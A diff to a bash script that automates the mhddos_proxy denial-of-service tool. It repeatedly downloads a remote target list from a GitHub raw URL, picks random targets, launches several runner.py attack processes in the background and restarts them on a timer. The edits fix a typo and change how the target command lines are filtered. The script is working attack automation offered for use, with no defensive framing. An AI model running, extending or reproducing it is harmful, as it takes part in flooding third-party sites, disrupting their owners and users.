@@ -42,7 +42,7 @@ do
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
-   # Create list with random numbers. To choose random targets from lis on next step.
+   # Create list with random numbers. To choose random targets from list on next step.
    random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
    echo -e "random numbers: " $random_numbers "\n"
    
@@ -50,19 +50,16 @@ do
    echo -e "Choosen targets:\n"
    for i in $random_numbers
    do
-             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat)")
-             echo -e "-- "$site"\n"
+             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | grep "runner.py")")
+             echo -e "-- "$target"\n"
    done
       
-   # Launch multiple runner instances with different targets and different attack types.
+   # Launch multiple runner instances with different targets.
    for i in $random_numbers
    do
-            # Filter and only get lines that starts with "runner.py". Then get one target from that new list.
-            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | grep "runner.py")")
-            
-            # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
-            cmd_line=$(echo $site | awk -F "#" '{print $1}')
-            
+            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | grep "runner.py")")
+           
             #echo $cmd_line
             
             python3 ~/mhddos_proxy/$cmd_line&
@@ -70,5 +67,5 @@ do
 echo "#####################################"
 sleep $restart_interval
 echo -e "n RESTARTING\n"
-pkill -f start.py
+pkill -f runner.py
 done
